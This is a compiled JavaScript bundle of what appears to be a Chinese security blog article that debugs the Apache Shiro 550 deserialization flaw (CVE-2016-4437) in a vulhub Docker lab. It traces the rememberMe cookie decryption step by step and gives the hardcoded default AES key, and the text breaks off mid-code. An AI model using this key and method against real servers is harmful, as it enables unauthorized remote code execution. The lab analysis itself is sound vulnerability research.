"use strict";(self.webpackChunkblog_source_2025=self.webpackChunkblog_source_2025||[]).push([[5331],{4220:(e,s,n)=>{n.d(s,{A:()=>i});const i=n.p+"assets/images/image-20211012150157734-d5bf064653c3fb5bda49031fdc2d2075.png"},4730:(e,s,n)=>{n.d(s,{A:()=>i});const i=n.p+"assets/images/image-20211012153617158-105ec5e358167c2077b9be16a89f860a.png"},8685:(e,s,n)=>{n.d(s,{A:()=>i});const i=n.p+"assets/images/image-20211012110107257-8028257ad947dbd635e7b13150f269e3.png"},14081:(e,s,n)=>{n.d(s,{A:()=>i});const i=n.p+"assets/images/image-20211012101652454-5492414badbd2d35f030e68fbc7e67fd.png"},14495:(e,s,n)=>{n.d(s,{A:()=>i});const i=n.p+"assets/images/image-20211012100748930-96f0874ec3b718c7b818074846746f2a.png"},19657:(e,s,n)=>{n.d(s,{A:()=>i});const i=n.p+"assets/images/image-20211012162131268-eae38a2fbdbea8dca16116a5504625ae.png"},25064:(e,s,n)=>{n.d(s,{A:()=>i});const i=n.p+"assets/images/image-20211012153209418-bfb2a276b171c1338c1bb4f60bf53756.png"},27600:(e,s,n)=>{n.d(s,{A:()=>i});const i=n.p+"assets/images/image-20211012160338231-5e5272c18d5a07b484dc9498d15dff94.png"},28453:(e,s,n)=>{n.d(s,{R:()=>r,x:()=>a});var i=n(96540);const d={},c=i.createContext(d);function r(e){const s=i.useContext(c);return i.useMemo((function(){return"function"==typeof e?e(s):{...s,...e}}),[s,e])}function a(e){let s;return s=e.disableParentContext?"function"==typeof e.components?e.components(d):e.components||d:r(e.components),i.createElement(c.Provider,{value:s},e.children)}},29401:(e,s,n)=>{n.d(s,{A:()=>i});const i=n.p+"assets/images/image-20211012152555069-06c03c8ab1250a82e6432aff148dfba2.png"},33004:(e,s,n)=>{n.d(s,{A:()=>i});const i=n.p+"assets/images/image-20211012151427964-d22132cd3a02fda25e0a2fac9ef05d4e.png"},34129:(e,s,n)=>{n.d(s,{A:()=>i});const i=n.p+"assets/images/image-20211012105534226-3a0650c0f3e1025a33f666daf20e608c.png"},37904:(e,s,n)=>{n.d(s,{A:()=>i});const i=n.p+"assets/images/image-20211012151608190-139e55711a9b8f692fbba3cedbd83044.png"},41294:(e,s,n)=>{n.d(s,{A:()=>i});const i=n.p+"assets/images/image-20211012090249146-5c54dcda70e81ead6b7cf750544c5347.png"},43861:(e,s,n)=>{n.d(s,{A:()=>i});const i=n.p+"assets/images/image-20211012170930594-212b918472cc0c480f0c193a6eeb3aa0.png"},45247:(e,s,n)=>{n.d(s,{A:()=>i});const i=n.p+"assets/images/image-20211012101909620-0bdc83b67decde78c0a40e601250cabf.png"},53939:(e,s,n)=>{n.r(s),n.d(s,{assets:()=>h,contentTitle:()=>a,default:()=>o,frontMatter:()=>r,metadata:()=>i,toc:()=>l});const i=JSON.parse('{"id":"\u4ee3\u7801\u5ba1\u8ba1/Java\u5b89\u5168/\u5e94\u7528\u6f0f\u6d1e\u5206\u6790/IDEA\u8fdc\u7a0b\u8c03\u8bd5Shiro550","title":"IDEA\u8fdc\u7a0b\u8c03\u8bd5Shiro550","description":"\u524d\u8a00","source":"@site/docs/02.\u4ee3\u7801\u5ba1\u8ba1/01.Java\u5b89\u5168/03.\u5e94\u7528\u6f0f\u6d1e\u5206\u6790/07.IDEA\u8fdc\u7a0b\u8c03\u8bd5Shiro550.md","sourceDirName":"02.\u4ee3\u7801\u5ba1\u8ba1/01.Java\u5b89\u5168/03.\u5e94\u7528\u6f0f\u6d1e\u5206\u6790","slug":"/\u4ee3\u7801\u5ba1\u8ba1/Java\u5b89\u5168/\u5e94\u7528\u6f0f\u6d1e\u5206\u6790/IDEA\u8fdc\u7a0b\u8c03\u8bd5Shiro550","permalink":"/docs/\u4ee3\u7801\u5ba1\u8ba1/Java\u5b89\u5168/\u5e94\u7528\u6f0f\u6d1e\u5206\u6790/IDEA\u8fdc\u7a0b\u8c03\u8bd5Shiro550","draft":false,"unlisted":false,"tags":[],"version":"current","lastUpdatedBy":"d4m1ts","lastUpdatedAt":1748751990000,"sidebarPosition":7,"frontMatter":{},"sidebar":"knowledgeBaseSidebar","previous":{"title":"log4j2_rce\u5206\u6790","permalink":"/docs/\u4ee3\u7801\u5ba1\u8ba1/Java\u5b89\u5168/\u5e94\u7528\u6f0f\u6d1e\u5206\u6790/log4j2_rce\u5206\u6790"},"next":{"title":"RCE\u56de\u663e\u94fe","permalink":"/docs/category/rce\u56de\u663e\u94fe"}}');var d=n(74848),c=n(28453);const r={},a=void 0,h={},l=[{value:"\u524d\u8a00",id:"\u524d\u8a00",level:2},{value:"\u6f0f\u6d1e\u73af\u5883\u642d\u5efa",id:"\u6f0f\u6d1e\u73af\u5883\u642d\u5efa",level:2},{value:"\u8fdc\u7a0b\u8c03\u8bd5\u51c6\u5907",id:"\u8fdc\u7a0b\u8c03\u8bd5\u51c6\u5907",level:2},{value:"\u5f00\u59cb\u8c03\u8bd5",id:"\u5f00\u59cb\u8c03\u8bd5",level:2},{value:"POC\u7f16\u5199",id:"poc\u7f16\u5199",level:2},{value:"\u6f0f\u6d1e\u4fee\u590d",id:"\u6f0f\u6d1e\u4fee\u590d",level:2},{value:"\u603b\u7ed3",id:"\u603b\u7ed3",level:2},{value:"\u5206\u6790\u8fc7\u7a0b",id:"\u5206\u6790\u8fc7\u7a0b",level:3},{value:"\u51e0\u79cd\u5e38\u89c1\u7684\u8fdc\u7a0b\u8c03\u8bd5\u7684\u65b9\u6cd5",id:"\u51e0\u79cd\u5e38\u89c1\u7684\u8fdc\u7a0b\u8c03\u8bd5\u7684\u65b9\u6cd5",level:3}];function t(e){const s={a:"a",blockquote:"blockquote",code:"code",h2:"h2",h3:"h3",hr:"hr",img:"img",li:"li",ol:"ol",p:"p",pre:"pre",strong:"strong",ul:"ul",...(0,c.R)(),...e.components};return(0,d.jsxs)(d.Fragment,{children:[(0,d.jsx)(s.h2,{id:"\u524d\u8a00",children:"\u524d\u8a00"}),"\n",(0,d.jsx)(s.p,{children:"Apache Shiro\u662f\u4e00\u6b3e\u5f00\u6e90\u5b89\u5168\u6846\u67b6\uff0c\u63d0\u4f9b\u8eab\u4efd\u9a8c\u8bc1\u3001\u6388\u6743\u3001\u5bc6\u7801\u5b66\u548c\u4f1a\u8bdd\u7ba1\u7406\u3002Shiro\u6846\u67b6\u76f4\u89c2\u3001\u6613\u7528\uff0c\u540c\u65f6\u4e5f\u80fd\u63d0\u4f9b\u5065\u58ee\u7684\u5b89\u5168\u6027\u3002\u5728\u5b83\u7f16\u53f7\u4e3a550 \u7684issue\uff08CVE-2016-4437\uff09\u4e2d\u7206\u51fa\u4e25\u91cd\u7684Java\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e\u3002"}),"\n",(0,d.jsxs)(s.blockquote,{children:["\n",(0,d.jsx)(s.p,{children:(0,d.jsx)(s.a,{href:"https://issues.apache.org/jira/browse/SHIRO-550",children:"https://issues.apache.org/jira/browse/SHIRO-550"})}),"\n"]}),"\n",(0,d.jsx)(s.p,{children:(0,d.jsx)(s.img,{alt:"image-20211011171345284",src:n(92259).A+"",width:"2278",height:"1434"})}),"\n",(0,d.jsxs)(s.p,{children:["\u5982\u4e0a\u6240\u8ff0\uff0c\u5728",(0,d.jsx)(s.code,{children:"Apache Shiro<=1.2.4"}),"\u7248\u672c\u4e2d\uff0c",(0,d.jsx)(s.strong,{children:"Cookie\u503c\u4f1a\u9996\u5148base64\u89e3\u7801\uff0c\u7136\u540eAES\u89e3\u5bc6\uff0c\u6700\u540e\u53cd\u5e8f\u5217\u5316"}),"\u3002"]}),"\n",(0,d.jsxs)(s.p,{children:["\u4f46AES\u9ed8\u8ba4\u52a0\u5bc6\u5bc6\u94a5\u662f\u786c\u7f16\u7801\u5728\u4ee3\u7801\u4e2d\u7684\uff0c\u56e0\u6b64\u4efb\u4f55\u4eba\u53ef\u4ee5\u521b\u5efa\u4e00\u4e2a\u6076\u610f\u5bf9\u8c61\uff0c\u7136\u540e\u5bf9\u5176\u8fdb\u884c\u5e8f\u5217\u5316\u3001\u52a0\u5bc6\u548c\u7f16\u7801\uff0c\u5c06\u7ed3\u679c\u901a\u8fc7Cookie\u4e2d\u7684",(0,d.jsx)(s.code,{children:"RememberMe"}),"\u53d1\u9001\u7ed9\u670d\u52a1\u7aef\uff0c\u8ba9\u5176\u6267\u884c\u6211\u4eec\u7684\u6076\u610f\u4ee3\u7801\u3002"]}),"\n",(0,d.jsx)(s.h2,{id:"\u6f0f\u6d1e\u73af\u5883\u642d\u5efa",children:"\u6f0f\u6d1e\u73af\u5883\u642d\u5efa"}),"\n",(0,d.jsxs)(s.p,{children:["\u8fd9\u91cc\u91c7\u7528vulhub\u4e0a\u7684\u73af\u5883\u6765\u642d\u5efa\uff1a",(0,d.jsx)(s.a,{href:"https://github.com/vulhub/vulhub/tree/master/shiro/CVE-2016-4437",children:"https://github.com/vulhub/vulhub/tree/master/shiro/CVE-2016-4437"})]}),"\n",(0,d.jsx)(s.pre,{children:(0,d.jsx)(s.code,{className:"language-bash",children:"docker pull vulhub/shiro:1.2.4\ndocker run -it -d --rm --name shiro550 -p 8000:8080 vulhub/shiro:1.2.4\n"})}),"\n",(0,d.jsx)(s.p,{children:"\u8bbf\u95ee8000\u7aef\u53e3\uff0c\u51fa\u73b0\u5982\u4e0b\u754c\u9762\u8bf4\u660edocker\u91cc\u9762\u7684\u73af\u5883\u542f\u52a8\u6210\u529f"}),"\n",(0,d.jsx)(s.p,{children:(0,d.jsx)(s.img,{alt:"image-20211012090249146",src:n(41294).A+"",width:"2482",height:"1486"})}),"\n",(0,d.jsx)(s.p,{children:"\u4f7f\u7528\u5229\u7528\u5de5\u5177\uff0c\u53ef\u6210\u529f\u6267\u884c\u547d\u4ee4"}),"\n",(0,d.jsx)(s.p,{children:(0,d.jsx)(s.img,{alt:"image-20211012093703190",src:n(59317).A+"",width:"2000",height:"1656"})}),"\n",(0,d.jsx)(s.h2,{id:"\u8fdc\u7a0b\u8c03\u8bd5\u51c6\u5907",children:"\u8fdc\u7a0b\u8c03\u8bd5\u51c6\u5907"}),"\n",(0,d.jsxs)(s.blockquote,{children:["\n",(0,d.jsx)(s.p,{children:(0,d.jsx)(s.strong,{children:"\u5373\u4fbf\u662f\u8fdc\u7a0b\u8c03\u8bd5\uff0c\u672c\u5730\u4e5f\u9700\u8981\u4e00\u4efd\u76f8\u540c\u7684\u4ee3\u7801"})}),"\n"]}),"\n",(0,d.jsx)(s.p,{children:"\u6211\u4eec\u9700\u8981\u5148\u628a\u4ee3\u7801\u641e\u5230\u672c\u5730\uff0c\u67e5\u770b\u5f53\u524d\u5bb9\u5668\u542f\u52a8\u7684\u547d\u4ee4"}),"\n",(0,d.jsx)(s.pre,{children:(0,d.jsx)(s.code,{className:"language-bash",children:"docker ps --no-trunc\n"})}),"\n",(0,d.jsx)(s.p,{children:(0,d.jsx)(s.img,{alt:"image-20211012095010868",src:n(72878).A+"",width:"3580",height:"238"})}),"\n",(0,d.jsx)(s.p,{children:"\u53ef\u4ee5\u770b\u5230\u4f7f\u7528\u7684\u662f\u4e00\u4e2ajar\u5305\u542f\u52a8\u73af\u5883\uff0c\u590d\u5236\u5230\u672c\u5730"}),"\n",(0,d.jsx)(s.pre,{children:(0,d.jsx)(s.code,{className:"language-bash",children:"docker cp shiro550:/shirodemo-1.0-SNAPSHOT.jar ./\n"})}),"\n",(0,d.jsxs)(s.p,{children:["\u56e0\u4e3a\u672c\u5730\u4e5f\u9700\u8981\u4e00\u4efd\u76f8\u540c\u7684\u4ee3\u7801\uff0c\u5c1d\u8bd5\u76f4\u63a5\u65b0\u5efa\u4e00\u4e2a\u9879\u76ee\uff0c\u5c06jar\u6587\u4ef6\u5f53\u4f5c\u4f9d\u8d56\u5f15\u5165\u5230IDEA\u4e2d\uff0c\u53d1\u73b0IDEA\u53ef\u4ee5\u76f4\u63a5\u5c06",(0,d.jsx)(s.code,{children:"classes"}),"\u76ee\u5f55\u4e0b\u7684\u6587\u4ef6\u8fd8\u539f\u6210\u4ee3\u7801\uff0c\u4f46",(0,d.jsx)(s.code,{children:"lib"}),"\u76ee\u5f55\u4e0b\u8fd8\u6709\u4e00\u4e9bjar\uff0c\u8fd9\u4e9bjar\u56e0\u4e3a\u4e0d\u662f\u5f53\u6210\u4f9d\u8d56\u5f15\u5165\u5230\u9879\u76ee\u4e2d\u7684\uff0c\u6240\u4ee5\u770b\u4e0d\u5230\u4ee3\u7801\uff0c\u4e5f\u5c31\u65e0\u6cd5\u8c03\u8bd5"]}),"\n",(0,d.jsx)(s.p,{children:(0,d.jsx)(s.img,{alt:"image-20211012100748930",src:n(14495).A+"",width:"3584",height:"2240"})}),"\n",(0,d.jsxs)(s.p,{children:["\u89e3\u538b",(0,d.jsx)(s.code,{children:"shirodemo-1.0-SNAPSHOT.jar"}),"\u5230\u9879\u76ee\u6839\u76ee\u5f55\uff0c\u7136\u540e\u53f3\u952elib\u76ee\u5f55\u9009\u62e9",(0,d.jsx)(s.code,{children:"Add as Library"}),"\u5c06\u8fd9\u4e9bjar\u5168\u90e8\u6dfb\u52a0\u5230\u4f9d\u8d56\u4e2d"]}),"\n",(0,d.jsx)(s.p,{children:(0,d.jsx)(s.img,{alt:"image-20211012101652454",src:n(14081).A+"",width:"3584",height:"2240"})}),"\n",(0,d.jsx)(s.p,{children:"\u6dfb\u52a0\u540e\u5c31\u53ef\u4ee5\u770b\u8fd9\u4e2ajar\u7684\u4ee3\u7801\u4e86\uff0c\u4e5f\u5c31\u53ef\u4ee5\u8c03\u8bd5\u4e86"}),"\n",(0,d.jsx)(s.p,{children:(0,d.jsx)(s.img,{alt:"image-20211012101909620",src:n(45247).A+"",width:"3584",height:"2240"})}),"\n",(0,d.jsxs)(s.p,{children:["\u6700\u540e\u8fd8\u9700\u8981\u5c06\u8981\u8c03\u8bd5\u7684class\u6587\u4ef6\u5939\u6dfb\u52a0\u5230\u4f9d\u8d56\u5173\u7cfb\u4e2d\uff0c\u8fd9\u91cc\u5c31\u662f",(0,d.jsx)(s.code,{children:"BOOT-INF"}),"\u76ee\u5f55\u4e0b\u7684\u6240\u6709\u6587\u4ef6\uff0c\u4e0d\u6dfb\u52a0\u7684\u8bdd\u5728class\u6587\u4ef6\u4e2d\u4e0b\u65ad\u70b9\u662f\u65e0\u6cd5\u62e6\u622a\u7684\u3002"]}),"\n",(0,d.jsxs)(s.ul,{children:["\n",(0,d.jsx)(s.li,{children:"\u6ca1\u52a0\u4f9d\u8d56\uff0c\u65ad\u70b9\u8d70\u4e0d\u5230\u90a3\u53bb\uff0c\u5b83\u4e0d\u77e5\u9053\u5e94\u8be5\u8d70\u54ea\u91cc"}),"\n",(0,d.jsx)(s.li,{children:"\u52a0\u4e86\u4f9d\u8d56\uff0c\u5c31\u77e5\u9053\u4f60\u7528\u7684\u54ea\u4e00\u4e2a\uff0c\u65ad\u70b9\u5c31\u76f4\u63a5\u53bb\u90a3\u4e86"}),"\n"]}),"\n",(0,d.jsx)(s.p,{children:(0,d.jsx)(s.img,{alt:"image-20211012102432067",src:n(71728).A+"",width:"2048",height:"1686"})}),"\n",(0,d.jsx)(s.p,{children:"\u8fd9\u4e2a\u65f6\u5019\u672c\u5730\u4ee3\u7801\u51c6\u5907\u5c31\u5b8c\u6210\u4e86\uff0c\u603b\u7ed3\u4e00\u4e0b\u4e3b\u8981\u662f3\u6b65\uff1a"}),"\n",(0,d.jsxs)(s.ol,{children:["\n",(0,d.jsx)(s.li,{children:"\u83b7\u53d6jar\u6587\u4ef6\u5230\u672c\u5730\uff0c\u5c06\u5176\u4f5c\u4e3a\u4f9d\u8d56\u5f15\u5165"}),"\n",(0,d.jsx)(s.li,{children:"\u7ed9\u8fd9\u4e2ajar\u6587\u4ef6\u6240\u9700\u8981\u7684\u4f9d\u8d56\u4e5f\u6dfb\u52a0\u5230\u672c\u5730\u4f9d\u8d56\u4e2d"}),"\n",(0,d.jsxs)(s.li,{children:["\u7ed9\u9700\u8981\u8c03\u8bd5\u7684class\u6587\u4ef6\u5939\u6dfb\u52a0\u5230",(0,d.jsx)(s.code,{children:"Dependencies"}),"\u4e2d"]}),"\n"]}),"\n",(0,d.jsx)(s.hr,{}),"\n",(0,d.jsxs)(s.p,{children:["\u7136\u540e\u5c31\u662f\u8fdc\u7a0b\u8c03\u8bd5\u90e8\u5206\uff0c\u53c2\u8003",(0,d.jsx)(s.a,{href:"https://blog.jetbrains.com/zh-hans/2019/07/31/intellij-idea-docker/",children:"\u4f7f\u7528 IntelliJ IDEA \u5728 Docker \u4e2d\u8c03\u8bd5 Java \u5e94\u7528\u7a0b\u5e8f"}),"\uff0c\u4e3b\u8981\u662f\u4ee5debug\u6a21\u5f0f\u542f\u7528\u670d\u52a1\u7aef\uff0c\u6dfb\u52a0\u7684jar\u542f\u52a8\u547d\u4ee4\u53c2\u6570\u5982\u4e0b"]}),"\n",(0,d.jsx)(s.pre,{children:(0,d.jsx)(s.code,{className:"language-bash",children:"# jdk<=1.7\n-Xdebug -Xrunjdwp:transport=dt_socket,server=y,suspend=n,address=5005\n# jdk>1.7\n-agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=5005\n\n# - transport\uff1a\u76d1\u542cSocket\u7aef\u53e3\u8fde\u63a5\u65b9\u5f0f\uff08\u4e5f\u53ef\u4ee5dt_shmem\u5171\u4eab\u5185\u5b58\u65b9\u5f0f\uff0c\u4f46\u9650\u4e8ewindows\u673a\u5668\uff0c\u5e76\u4e14\u670d\u52a1\u63d0\u4f9b\u7aef\u548c\u8c03\u8bd5\u7aef\u53ea\u80fd\u4f4d\u4e8e\u540c\u4e00\u53f0\u673a\uff09\n# - server\uff1a=y\u8868\u793a\u5f53\u524d\u662f\u8c03\u8bd5\u670d\u52a1\u7aef\uff0c=n\u8868\u793a\u5f53\u524d\u662f\u8c03\u8bd5\u5ba2\u6237\u7aef\n# - suspend\uff1a=n\u8868\u793a\u542f\u52a8\u65f6\u4e0d\u4e2d\u65ad\uff08\u5982\u679c\u542f\u52a8\u65f6\u4e2d\u65ad\uff0c\u4e00\u822c\u7528\u4e8e\u8c03\u8bd5\u542f\u52a8\u4e0d\u4e86\u7684\u95ee\u9898\uff09\n# - address\uff1a=5005\u8868\u793a\u672c\u5730\u76d1\u542c5005\u7aef\u53e3\uff08\u9ed8\u8ba45005\uff09\n"})}),"\n",(0,d.jsx)(s.p,{children:"\u8fd9\u91ccjava\u7248\u672c\u4e3ajdk1.8\uff0c\u6240\u4ee5\u65b0\u7684docker\u5bb9\u5668\u542f\u52a8\u547d\u4ee4"}),"\n",(0,d.jsx)(s.pre,{children:(0,d.jsx)(s.code,{className:"language-bash",children:"docker run -it -d --rm --name shiro550 -p 127.0.0.1:8000:8080 -p 127.0.0.1:5005:5005 vulhub/shiro:1.2.4 java -agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=5005 -jar /shirodemo-1.0-SNAPSHOT.jar\n"})}),"\n",(0,d.jsx)(s.p,{children:"\u7136\u540e\u5728IDEA\u4e2d\u6dfb\u52a0\u4e00\u4e2aremote\u5373\u53ef"}),"\n",(0,d.jsx)(s.p,{children:(0,d.jsx)(s.img,{alt:"image-20211012105534226",src:n(34129).A+"",width:"2142",height:"1364"})}),"\n",(0,d.jsxs)(s.p,{children:["\u70b9\u51fb",(0,d.jsx)(s.code,{children:"Debug"}),"\uff0c\u663e\u793a",(0,d.jsx)(s.code,{children:"Connected to the target VM, address: 'localhost:5005', transport: 'socket'"}),"\u8bf4\u660e\u6210\u529f"]}),"\n",(0,d.jsx)(s.p,{children:"\u767b\u9646\u5904\u4e0b\u4e2a\u65ad\u70b9\uff0c\u6709\u7eff\u8272\u7684\u5c0f\u52fe\u8bf4\u660e\u4e0b\u65ad\u70b9\u6210\u529f"}),"\n",(0,d.jsx)(s.p,{children:(0,d.jsx)(s.img,{alt:"image-20211012110107257",src:n(8685).A+"",width:"3584",height:"2240"})}),"\n",(0,d.jsx)(s.p,{children:"\u7136\u540e\u53bb\u9875\u9762\u4e0a\u767b\u9646"}),"\n",(0,d.jsx)(s.p,{children:(0,d.jsx)(s.img,{alt:"image-20211012110132530",src:n(83695).A+"",width:"2064",height:"1540"})}),"\n",(0,d.jsx)(s.p,{children:"\u6210\u529f"}),"\n",(0,d.jsx)(s.p,{children:(0,d.jsx)(s.img,{alt:"image-20211012110150184",src:n(76174).A+"",width:"3584",height:"2240"})}),"\n",(0,d.jsx)(s.h2,{id:"\u5f00\u59cb\u8c03\u8bd5",children:"\u5f00\u59cb\u8c03\u8bd5"}),"\n",(0,d.jsxs)(s.p,{children:["\u6839\u636e\u6700\u5f00\u59cb\u7684\u63cf\u8ff0\uff0c\u6f0f\u6d1e\u89e6\u53d1\u4e3b\u8981\u6709","4\ufe0f\u20e3","\u6b65"]}),"\n",(0,d.jsxs)(s.ul,{children:["\n",(0,d.jsx)(s.li,{children:"\u4f20\u5165Cookie rememberMe"}),"\n",(0,d.jsx)(s.li,{children:"BASE64\u89e3\u7801"}),"\n",(0,d.jsx)(s.li,{children:"AES\u89e3\u7801"}),"\n",(0,d.jsx)(s.li,{children:"\u53cd\u5e8f\u5217\u5316"}),"\n"]}),"\n",(0,d.jsxs)(s.p,{children:["\u6839\u636e\u6f0f\u6d1e\u63cf\u8ff0\uff0cshiro\u4f7f\u7528\u7684",(0,d.jsx)(s.code,{children:"CookieRememberMeManager"}),"\u5b58\u5728\u95ee\u9898\uff0c\u5b9a\u4f4d\u5230\u5bf9\u5e94\u7684\u8def\u5f84\u5c31\u662f",(0,d.jsx)(s.code,{children:"org.apache.shiro.web.mgt.CookieRememberMeManager"})]}),"\n",(0,d.jsxs)(s.p,{children:["\u6211\u4eec\u770b\u4e0b\u8fd9\u4e2a\u7c7b\uff0c\u660e\u663e\u7684Cookie\u76f8\u5173\u64cd\u4f5c\uff0c\u56e0\u4e3a\u6f0f\u6d1e\u7684\u5165\u53e3\u70b9\u662f\u4f20\u5165\u7684cookie\uff0c\u8fd9\u91cc\u6211\u4eec\u5c31\u4ece\u83b7\u53d6\u5230Cookie\u5f00\u59cb\u8c03\u8bd5\u5206\u6790\uff0c\u5373\u5728",(0,d.jsx)(s.code,{children:"getCookie"}),"\u5904\u4e0b\u65ad\u70b9"]}),"\n",(0,d.jsx)(s.p,{children:(0,d.jsx)(s.img,{alt:"image-20211012150157734",src:n(4220).A+"",width:"1926",height:"1272"})}),"\n",(0,d.jsx)(s.p,{children:"\u5411\u670d\u52a1\u7aef\u53d1\u9001payload"}),"\n",(0,d.jsx)(s.p,{children:(0,d.jsx)(s.img,{alt:"image-20211012151427964",src:n(33004).A+"",width:"2768",height:"1838"})}),"\n",(0,d.jsxs)(s.p,{children:["\u6b64\u65f6\u670d\u52a1\u7aef\u83b7\u53d6cookie\u8c03\u7528",(0,d.jsx)(s.code,{children:"getCookie"}),"\u51fd\u6570\u5230\u8fbe\u6211\u4eec\u7684\u65ad\u70b9\u5904"]}),"\n",(0,d.jsx)(s.p,{children:(0,d.jsx)(s.img,{alt:"image-20211012150727798",src:n(82495).A+"",width:"3584",height:"2240"})}),"\n",(0,d.jsxs)(s.p,{children:["F8\uff0c\u53ef\u4ee5\u770b\u5230\u8fd9\u91cc\u5c06\u6211\u4eec\u4f20\u5165\u7684cookie\u503c\u8d4b\u503c\u5230\u4e86\u53c2\u6570",(0,d.jsx)(s.code,{children:"base64"}),"\u4e0a"]}),"\n",(0,d.jsx)(s.p,{children:(0,d.jsx)(s.img,{alt:"image-20211012151608190",src:n(37904).A+"",width:"3584",height:"2240"})}),"\n",(0,d.jsxs)(s.p,{children:["\u7ee7\u7eed\u8ddf\uff0c\u9996\u5148\u5224\u65ad\u5185\u5bb9\u662f\u4e0d\u662fdeleteMe\uff0c\u8fd9\u91cc\u660e\u663e\u4e0d\u662f\uff0c\u7136\u540e\u4f1a\u901a\u8fc7\u51fd\u6570",(0,d.jsx)(s.code,{children:"ensurePadding"}),"\u8fdb\u884cbase64\u586b\u5145\uff0c\u7136\u540e\u4f1a\u901a\u8fc7base64\u89e3\u7801\uff0c\u8d4b\u503c\u7ed9",(0,d.jsx)(s.code,{children:"byte[] decoded"}),"\uff0c\u6700\u540e\u8fd4\u56de",(0,d.jsx)(s.code,{children:"decoded"})]}),"\n",(0,d.jsx)(s.p,{children:(0,d.jsx)(s.img,{alt:"image-20211012152013338",src:n(73913).A+"",width:"3584",height:"2240"})}),"\n",(0,d.jsxs)(s.p,{children:["\u8fd4\u56de\u7684\u5185\u5bb9\u4f1a\u8d4b\u503c\u7ed9",(0,d.jsx)(s.code,{children:"byte[] bytes"}),"\uff0c\u4e5f\u5c31\u662f\u8bf4\u73b0\u5728\u7684\u53d8\u91cf",(0,d.jsx)(s.code,{children:"bytes"}),"\u5c31\u662f\u5b58\u653e\u7684base64\u89e3\u7801\u540e\u7684cookie"]}),"\n",(0,d.jsx)(s.p,{children:(0,d.jsx)(s.img,{alt:"image-20211012152145756",src:n(59513).A+"",width:"3584",height:"2240"})}),"\n",(0,d.jsxs)(s.p,{children:["\u7ee7\u7eed\u8ddf\u8fdb\uff0c\u53d1\u73b0\u4f1a\u8c03\u7528",(0,d.jsx)(s.code,{children:"convertBytesToPrincipals"}),"\u51fd\u6570\uff0c\u5c06",(0,d.jsx)(s.code,{children:"bytes"}),"\u4f5c\u4e3a\u53c2\u6570\u4f20\u5165\u8fdb\u53bb\uff0c\u5982\u679c\u52a0\u5bc6\u670d\u52a1\u5b58\u5728\uff0c\u5c31\u901a\u8fc7",(0,d.jsx)(s.code,{children:"this.decrypt()"}),"\u51fd\u6570\u5bf9",(0,d.jsx)(s.code,{children:"bytes"}),"\u8fdb\u884c\u89e3\u5bc6\uff1b"]}),"\n",(0,d.jsx)(s.p,{children:(0,d.jsx)(s.img,{alt:"image-20211012152555069",src:n(29401).A+"",width:"3584",height:"2240"})}),"\n",(0,d.jsx)(s.p,{children:"\u52a0\u5bc6\u670d\u52a1\u5b58\u5728\uff0c\u770b\u4e0b\u52a0\u5bc6\u670d\u52a1\u4fe1\u606f\uff0c\u53d1\u73b0\u4f7f\u7528\u7684\u5c31\u662fAES\u7684CBC\u6a21\u5f0f\u52a0\u5bc6\uff0c\u586b\u5145\u6a21\u5f0f\u4e3aPKCS5Padding"}),"\n",(0,d.jsx)(s.p,{children:(0,d.jsx)(s.img,{alt:"image-20211012152946115",src:n(81049).A+"",width:"944",height:"726"})}),"\n",(0,d.jsxs)(s.p,{children:["\u8ddf\u8fdb",(0,d.jsx)(s.code,{children:"decrypt"}),"\u51fd\u6570\uff0c\u53d1\u73b0\u5176\u901a\u8fc7\u51fd\u6570",(0,d.jsx)(s.code,{children:"this.getDecryptionCipherKey()"}),"\u6765\u83b7\u53d6\u89e3\u5bc6\u5bc6\u94a5"]}),"\n",(0,d.jsx)(s.p,{children:(0,d.jsx)(s.img,{alt:"image-20211012153209418",src:n(25064).A+"",width:"2904",height:"736"})}),"\n",(0,d.jsxs)(s.p,{children:["\u8ddf\u8fdb\uff0c\u4e0d\u96be\u770b\u51fa\uff0c",(0,d.jsx)(s.code,{children:"this.decryptionCipherKey"}),"\u5c31\u662f\u9ed8\u8ba4key",(0,d.jsx)(s.code,{children:"kPH+bIxk5D2deZiIxcaaaA=="}),"\u7684base64\u89e3\u7801\u7684\u503c\uff0c\u4e5f\u5c31\u662f\u5bc6\u94a5"]}),"\n",(0,d.jsx)(s.p,{children:(0,d.jsx)(s.img,{alt:"image-20211012153617158",src:n(4730).A+"",width:"2042",height:"1966"})}),"\n",(0,d.jsxs)(s.p,{children:["\u8fd4\u56de\u5bc6\u94a5\u540e\u8fdb\u5165\u89e3\u5bc6\u51fd\u6570",(0,d.jsx)(s.code,{children:"cipherService.decrypt"})]}),"\n",(0,d.jsx)(s.p,{children:(0,d.jsx)(s.img,{alt:"image-20211012161951771",src:n(57603).A+"",width:"2892",height:"300"})}),"\n",(0,d.jsxs)(s.p,{children:["\u5927\u5bb6\u90fd\u77e5\u9053AES\u89e3\u5bc6\u9664\u4e86\u5bc6\u94a5\u8fd8\u9700\u8981\u4e00\u4e2a\u504f\u79fb\u91cfIV\uff0c\u4e4b\u524d\u4e00\u76f4\u6ca1\u7ed9\u51fa\u6765\uff0c\u6240\u4ee5\u5e94\u8be5\u4e5f\u662f\u5728\u89e3\u5bc6\u51fd\u6570\u91cc\u9762\uff0c\u8ddf\u8fdb\uff0c\u8ddf\u51e0\u6b65\u5c31\u80fd\u770b\u5230IV\uff0c\u5b57\u8282\u662f16\u4e2a0\uff0c\u7ffb\u8bd1\u8fc7\u6765\u5c31\u662f",(0,d.jsx)(s.code,{children:"' '*16"})]}),"\n",(0,d.jsx)(s.p,{children:(0,d.jsx)(s.img,{alt:"image-20211012160338231",src:n(27600).A+"",width:"2598",height:"1616"})}),"\n",(0,d.jsxs)(s.p,{children:["\u6700\u540e\u7684\u7ed3\u679c",(0,d.jsx)(s.code,{children:"serialized"}),"\u5c31\u662f\u6211\u4eec\u4f20\u5165\u7684\u6076\u610f\u5e8f\u5217\u5316\u6570\u636e"]}),"\n",(0,d.jsx)(s.p,{children:(0,d.jsx)(s.img,{alt:"image-20211012162131268",src:n(19657).A+"",width:"2886",height:"992"})}),"\n",(0,d.jsxs)(s.p,{children:["\u56de\u5230",(0,d.jsx)(s.code,{children:"convertBytesToPrincipals"}),"\uff0c\u89e3\u5bc6\u540e\u83b7\u53d6\u5230\u7684\u6570\u636e\u5373\u4e3a",(0,d.jsx)(s.code,{children:"serialized"}),"\uff0c\u4e5f\u5c31\u662f\u6211\u4eec\u7684\u6076\u610f\u5e8f\u5217\u5316\u6570\u636e\uff0c\u7136\u540e\u8c03\u7528",(0,d.jsx)(s.code,{children:"